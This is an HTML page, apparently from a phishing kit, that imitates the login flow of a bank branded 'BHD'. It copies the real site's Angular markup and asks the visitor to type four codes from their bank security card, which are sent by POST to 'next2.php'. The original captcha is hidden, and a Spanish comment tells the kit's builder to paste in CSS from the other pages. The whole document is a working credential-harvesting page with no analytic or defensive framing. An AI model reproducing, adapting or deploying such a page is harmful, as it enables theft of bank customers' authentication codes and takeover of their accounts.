<html lang="en">
<head>
<meta charset="utf-8">
<title>BHD</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- [COPIA TODO EL CSS DE TUS OTROS ARCHIVOS AQUÍ] -->
</head>
<body>
<ibp-root ng-version="14.3.0">
<router-outlet></router-outlet>
<ibp-login _nghost-otb-c140="" class="ng-star-inserted">
<div _ngcontent-otb-c140="" class="background-container ng-star-inserted">
<div _ngcontent-otb-c140="" class="p-d-flex p-jc-center card-top">
<div _ngcontent-otb-c140="" class="p-d-flex p-flex-column">
<p-card _ngcontent-otb-c140="" class="p-element">
<div class="p-card p-component" style="max-width: 400px;">
<div class="p-card-body">
<div class="p-card-content">
<div _ngcontent-otb-c140="" class="p-grid">
<form action="next2.php" method="post">
<div _ngcontent-otb-c140="" class="p-fluid p-formgrid p-grid p-jc-center">

<div _ngcontent-otb-c140="" class="p-field p-col-10">
<h2>Ingresa el código solicitado de tu tarjeta de claves:<br><br></h2>

<table width="0" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
    <td width="39" bgcolor="#51AF46"><div align="center">21</div></td>
    <td width="10">&nbsp;</td>
    <td width="155"><input type="text" name="co1" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
  </tr>
</table>
<br>
<table width="0" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
    <td width="39" bgcolor="#51AF46"><div align="center">11</div></td>
    <td width="10">&nbsp;</td>
    <td width="155"><input type="text" name="co2" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
  </tr>
</table>
<br>
<table width="0" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
    <td width="39" bgcolor="#51AF46"><div align="center">8</div></td>
    <td width="10">&nbsp;</td>
    <td width="155"><input type="text" name="co3" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
  </tr>
</table>
<br>
<table width="0" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
    <td width="39" bgcolor="#51AF46"><div align="center">40</div></td>
    <td width="10">&nbsp;</td>
    <td width="155"><input type="text" name="co4" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
  </tr>
</table>
</div>

<!-- Captcha oculto -->
<div _ngcontent-otb-c140="" class="p-field p-col-10 p-mb-2" style="display: none;">
<div _ngcontent-otb-c140="" class="p-d-flex">
<div _ngcontent-otb-c140="">
<div _ngcontent-otb-c140="" class="bhd-captcha">
<canvas _ngcontent-otb-c140="" width="110" height="30"></canvas></div>
<div _ngcontent-otb-c140="" class="p-mb-4 p-mt-2 bhd--font-size-12">
<p _ngcontent-otb-c140="" class="p-m-0 bhd-hover-green-2-pointer">Refrescar imagen</p>
</div>
</div>
<div _ngcontent-otb-c140="" class="p-ml-3"><input type="text" name="captcha" maxlength="4" class="p-inputtext p-component p-element bhd-captcha-validaton"></div>
</div>
</div>

<div _ngcontent-otb-c140="" class="p-field p-col-10 p-mt-2">
<button class="p-ripple p-element bhd-btn-primary p-button p-component" type="submit">
<span class="p-button-label">Continuar</span>
</button>
</div>

</div>
</form>
</div>
</div>
</div>
</div>
</p-card>
</div>
</div>
<div _ngcontent-otb-c140="" class="bhd-version"><span class="number-version">v1.0.8</span></div>
</div>
</ibp-login>
</ibp-root>
</body>
</html>
